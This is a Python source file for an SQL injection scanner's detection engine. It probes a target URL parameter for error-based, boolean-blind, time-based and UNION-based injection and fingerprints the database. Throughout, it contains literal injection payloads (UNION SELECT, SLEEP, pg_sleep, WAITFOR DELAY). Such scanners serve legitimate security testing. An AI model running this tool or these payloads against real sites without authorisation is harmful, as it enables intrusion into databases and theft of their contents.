# scanner/detection_engine.py
import time
from utils.logger import Logger
from scanner.payloads import PayloadGenerator

class DetectionEngine:
    """
    Advanced SQLi detection engine with multiple strategies
    - Error-based detection
    - Boolean-based blind detection
    - Time-based blind detection
    """
    
    def __init__(self, request_handler, response_analyzer):
        self.request_handler = request_handler
        self.response_analyzer = response_analyzer
        self.payload_gen = PayloadGenerator()
        self.logger = Logger("detection_engine.log")
        
    def test_error_based(self, url, param_name, method="GET", data=None, headers=None, 
                          dbms="generic", retries=2):
        """
        Test for error-based SQL injection
        Returns: (is_vulnerable, payload, confidence, detection_info)
        """
        payloads = self.payload_gen.get_payloads("error", dbms=dbms)
        
        for payload in payloads[:5]:  # Test first 5 error payloads
            for attempt in range(retries):
                response, _ = self.request_handler.send_request(
                    url, method, data, headers,
                    payload_injection={
                        "param": param_name,
                        "payload": payload,
                        "injection_point": "url" if method == "GET" else "post"
                    }
                )
                
                if response:
                    is_error, confidence = self.response_analyzer.detect_error_response(
                        response, dbms
                    )
                    
                    if is_error and confidence > 0.6:
                        self.logger.vulnerable(
                            f"Error-based SQLi found: {param_name} with payload [{payload}], "
                            f"confidence: {confidence:.2%}"
                        )
                        return True, payload, confidence, {"method": "error", "sql_error": response.text[:200]}
                
                time.sleep(0.1)
        
        return False, None, 0, {}

    def test_boolean_based(self, url, param_name, method="GET", data=None, headers=None, 
                           dbms="generic", retries=3, baseline=None):
        """
        Test for boolean-based blind SQL injection
        Returns: (is_vulnerable, true_payload, false_payload, confidence, detection_info)
        """
        boolean_payloads = self.payload_gen.get_payloads("boolean", dbms=dbms)
        
        if not boolean_payloads:
            return False, None, None, 0, {}
        
        # Get baseline if not provided
        if not baseline:
            baseline_resp, _ = self.request_handler.send_request(
                url, method, data, headers
            )
        else:
            baseline_resp = baseline
        
        for payload_tuple in boolean_payloads:
            if isinstance(payload_tuple, tuple) and len(payload_tuple) == 2:
                true_payload, false_payload = payload_tuple
            else:
                continue
            
            differences_found = 0
            
            for attempt in range(retries):
                # Send true condition payload
                true_resp, _ = self.request_handler.send_request(
                    url, method, data, headers,
                    payload_injection={
                        "param": param_name,
                        "payload": true_payload,
                        "injection_point": "url" if method == "GET" else "post"
                    }
                )
                
                # Send false condition payload
                false_resp, _ = self.request_handler.send_request(
                    url, method, data, headers,
                    payload_injection={
                        "param": param_name,
                        "payload": false_payload,
                        "injection_point": "url" if method == "GET" else "post"
                    }
                )
                
                if true_resp and false_resp:
                    is_vulnerable, confidence, metric = self.response_analyzer.detect_boolean_difference(
                        true_resp, false_resp, sensitivity=0.1
                    )
                    
                    if is_vulnerable:
                        differences_found += 1
                
                time.sleep(0.1)
            
            # If consistent differences across retries
            if differences_found >= 2:  # At least 2 out of retries
                self.logger.vulnerable(
                    f"Boolean-based SQLi found: {param_name}, "
                    f"True: [{true_payload}], False: [{false_payload}]"
                )
                return True, true_payload, false_payload, 0.95, {
                    "method": "boolean",
                    "differences_found": differences_found,
                    "retries": retries
                }
        
        return False, None, None, 0, {}

    def test_time_based(self, url, param_name, method="GET", data=None, headers=None,
                        dbms="generic", delay=5, threshold=3.0, retries=2):
        """
        Test for time-based blind SQL injection
        Returns: (is_vulnerable, payload, confidence, detection_info)
        """
        time_payloads = self.payload_gen.get_payloads("time", dbms=dbms)
        
        # Get baseline timing
        baseline_times = []
        for _ in range(3):
            _, elapsed = self.request_handler.send_request(url, method, data, headers)
            if elapsed:
                baseline_times.append(elapsed)
            time.sleep(0.1)
        
        baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else 0
        
        for payload in time_payloads[:3]:  # Test first 3 time payloads
            confirmed_delays = 0
            
            for attempt in range(retries):
                start = time.time()
                response, elapsed = self.request_handler.send_request(
                    url, method, data, headers,
                    payload_injection={
                        "param": param_name,
                        "payload": payload,
                        "injection_point": "url" if method == "GET" else "post"
                    }
                )
                actual_delay = time.time() - start
                
                if response:
                    is_delayed, confidence, delay_time = self.response_analyzer.detect_time_delay(
                        baseline_avg, actual_delay, threshold=threshold
                    )
                    
                    if is_delayed:
                        confirmed_delays += 1
                        self.logger.debug(f"Delay detected: {actual_delay:.2f}s vs baseline {baseline_avg:.2f}s")
                
                time.sleep(0.5)
            
            # If consistent delays across retries
            if confirmed_delays >= retries - 1:  # At least most retries showed delay
                self.logger.vulnerable(
                    f"Time-based SQLi found: {param_name} with payload [{payload}], "
                    f"delay: {delay}s"
                )
                return True, payload, 0.95, {
                    "method": "time",
                    "baseline_avg": baseline_avg,
                    "delay_threshold": threshold,
                    "confirmed_delays": confirmed_delays
                }
        
        return False, None, 0, {}

    def test_union_based(self, url, param_name, method="GET", data=None, headers=None,
                         dbms="generic", retries=2):
        """
        Test for UNION-based SQL injection
        Returns: (is_vulnerable, columns_found, payload, confidence)
        """
        self.logger.debug(f"Testing UNION-based SQLi for parameter: {param_name}")
        
        # Try to find number of columns
        for num_cols in range(1, 15):
            columns = ",".join([str(i) for i in range(1, num_cols + 1)])
            payload = f"' UNION SELECT {columns}-- -"
            
            response, _ = self.request_handler.send_request(
                url, method, data, headers,
                payload_injection={
                    "param": param_name,
                    "payload": payload,
                    "injection_point": "url" if method == "GET" else "post"
                }
            )
            
            if response and response.status_code == 200:
                # Check if payload executed without error
                is_error, _ = self.response_analyzer.detect_error_response(response, dbms)
                if not is_error:
                    self.logger.vulnerable(
                        f"UNION-based SQLi with {num_cols} columns: {param_name}"
                    )
                    return True, num_cols, payload, 0.9
        
        return False, 0, None, 0

    def fingerprint_dbms(self, url, param_name, method="GET", data=None, headers=None):
        """
        Fingerprint target DBMS using behavioral payloads
        Returns: (dbms_name, confidence, version_info)
        """
        self.logger.debug(f"Starting DBMS fingerprinting for: {param_name}")
        
        fingerprint_queries = {
            "mysql": [
                ("' AND @@version-- -", "mysql"),
                ("' AND SLEEP(1)-- -", "mysql_sleep"),
            ],
            "postgresql": [
                ("' AND version()-- -", "postgresql"),
                ("' AND pg_sleep(1)-- -", "postgresql_sleep"),
            ],
            "mssql": [
                ("' AND @@version-- -", "mssql"),
                ("' AND WAITFOR DELAY '00:00:01'-- -", "mssql_waitfor"),
            ]
        }
        
        detected_dbms = {}
        
        for payload, dbms_name in fingerprint_queries.get(list(fingerprint_queries.keys())[0], []):
            response, elapsed = self.request_handler.send_request(
                url, method, data, headers,
                payload_injection={
                    "param": param_name,
                    "payload": payload,
                    "injection_point": "url" if method == "GET" else "post"
                }
            )
            
            if response:
                detected, confidence = self.response_analyzer.fingerprint_dbms(response)
                if detected != "unknown":
                    detected_dbms[detected] = confidence
        
        if detected_dbms:
            best_dbms = max(detected_dbms, key=detected_dbms.get)
            return best_dbms, detected_dbms[best_dbms], None
        
        return "unknown", 0, None
